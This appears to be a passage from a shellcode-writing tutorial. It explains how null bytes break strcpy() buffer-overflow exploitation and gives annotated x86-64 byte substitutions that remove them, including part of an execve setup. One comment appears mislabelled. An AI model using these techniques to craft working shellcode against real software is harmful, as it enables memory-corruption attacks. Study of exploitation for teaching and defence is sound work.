shellcode phase 4: zero tolerance
While the shellcode works when hard coding its character buffer
address instead of main's return address, it will not work as-is
when being overflowed during exploitation of strcpy().
The reason for is that there exist \x00 bytes in the middle
of the shellcode and this will terminate overrunning with strcpy()
prematurely before the entire buffer has been copied onto the stack.

There can be many reasons for having a \x00 in the middle of the
shellcode:
1. Placing a 0 somewhere in memory on in a register
2. Placing addresses/numbers consisting of 0's in an eightbyte
   representation
3. Etc...

The only place a \x00 must appear is at the end of the shellcode
for NULL termination to control where strcpy() will eventually
complete its copying.

In most cases various alternatives exist for direct use of \x00
in the assembly/machine code. For example:

Instead of:
    "\x48\x8d\x05\x1e\x00\x00\x00"  /* lea    0x1e(%rip),%rax    */
         and
    "\xb8\x3b\x00\x00\x00"          /* mov    $0x3b,%eax         */
do:
    "\x48\x8d\x05\x39\x11\x11\x11"  /* lea 0x11111139(%rip),%rax */
    "\x48\x2d\x11\x11\x11\x11"      /* sub    $0x11111111,%rax   */
         and
    "\xb8\x4c\x11\x11\x11"          /* mov    $0x3b,%eax         */
    "\x2d\x11\x11\x11\x11"          /* sub    $0x11111111,%eax   */

Instead of:
    "\x48\xc7\x44\x24\x08\x00..."   /* movq   $0x0,0x8(%rsp)     */
do:
    "\x48\x31\xc0"                  /* xor    %rax,%rax          */
    "\x48\x89\x44\x24\x08"          /* mov    %rax,0x8(%rsp)     */

Note that due to the additional lines, the jmp/call offsets
change a little.